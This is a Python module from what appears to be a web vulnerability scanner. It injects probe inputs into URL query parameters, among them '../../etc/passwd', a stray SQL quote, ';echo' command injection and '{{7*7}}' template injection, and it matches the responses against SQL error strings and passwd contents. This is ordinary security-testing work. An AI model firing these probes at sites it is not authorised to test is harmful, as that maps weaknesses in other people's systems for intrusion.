from __future__ import annotations

import re
import time

import requests

from .models import PageResult, EndpointSignal

# Unique marker used to detect reflection
_MARKER = "WBRECON7731"

# SQL error strings
_SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query",
    "sqlite3.operationalerror",
    "ora-01756",
    "microsoft ole db provider for sql",
    "odbc sql server driver",
    "syntax error or access violation",
]

# LFI confirmation strings
_LFI_HITS = ["root:x:0:0:", "/bin/bash", "/bin/sh", "[fonts]", "[boot loader]"]

# CMDI confirmation
_CMDI_HITS = ["uid=", "www-data", "root", _MARKER]

# SSTI confirmation
_SSTI_PAYLOAD = "{{7*7}}"
_SSTI_HIT = "49"


def _get(session: requests.Session, url: str, timeout: float, max_bytes: int) -> str:
    try:
        resp = session.get(url, timeout=timeout, verify=False, allow_redirects=True)
        raw = resp.content[:max_bytes]
        return raw.decode(resp.encoding or "utf-8", errors="replace").lower()
    except requests.RequestException:
        return ""


def _inject(target: str, param: str, value: str) -> str:
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    p = urlparse(target)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urlencode(qs, doseq=True)
    return urlunparse((p.scheme, p.netloc, p.path, p.params, new_query, ""))


def probe_page(
    page: PageResult,
    session: requests.Session,
    timeout: float,
    max_bytes: int,
    delay: float,
) -> list[EndpointSignal]:
    confirmed: list[EndpointSignal] = []

    for param in page.params:
        if delay:
            time.sleep(delay)

        # LFI probe
        url = _inject(page.url, param, "../../etc/passwd")
        text = _get(session, url, timeout, max_bytes)
        if any(h in text for h in _LFI_HITS):
            confirmed.append(EndpointSignal(
                url=url, method="GET", source="probe",
                vector="LFI", weight=10,
                detail=f"CONFIRMED: ?{param}=../../etc/passwd returned /etc/passwd content",
            ))
            continue  # no need to probe further on this param

        # SQLi probe
        url = _inject(page.url, param, "1'")
        text = _get(session, url, timeout, max_bytes)
        if any(e in text for e in _SQL_ERRORS):
            confirmed.append(EndpointSignal(
                url=url, method="GET", source="probe",
                vector="SQLI", weight=10,
                detail=f"CONFIRMED: ?{param}=1' triggered SQL error",
            ))
            continue

        # CMDI probe
        url = _inject(page.url, param, f";echo+{_MARKER}")
        text = _get(session, url, timeout, max_bytes)
        if _MARKER.lower() in text or any(h in text for h in _CMDI_HITS):
            confirmed.append(EndpointSignal(
                url=url, method="GET", source="probe",
                vector="CMDI", weight=10,
                detail=f"CONFIRMED: ?{param}=;echo+{_MARKER} returned marker or uid",
            ))
            continue

        # SSTI probe
        url = _inject(page.url, param, _SSTI_PAYLOAD)
        text = _get(session, url, timeout, max_bytes)
        if _SSTI_HIT in text:
            confirmed.append(EndpointSignal(
                url=url, method="GET", source="probe",
                vector="SSTI", weight=10,
                detail=f"CONFIRMED: ?{param}={{{{7*7}}}} returned 49 (template evaluation)",
            ))
            continue

        # XSS reflection probe
        url = _inject(page.url, param, _MARKER)
        text = _get(session, url, timeout, max_bytes)
        if _MARKER.lower() in text:
            confirmed.append(EndpointSignal(
                url=url, method="GET", source="probe",
                vector="XSS", weight=5,
                detail=f"?{param}={_MARKER} reflected unmodified in response",
            ))

    return confirmed
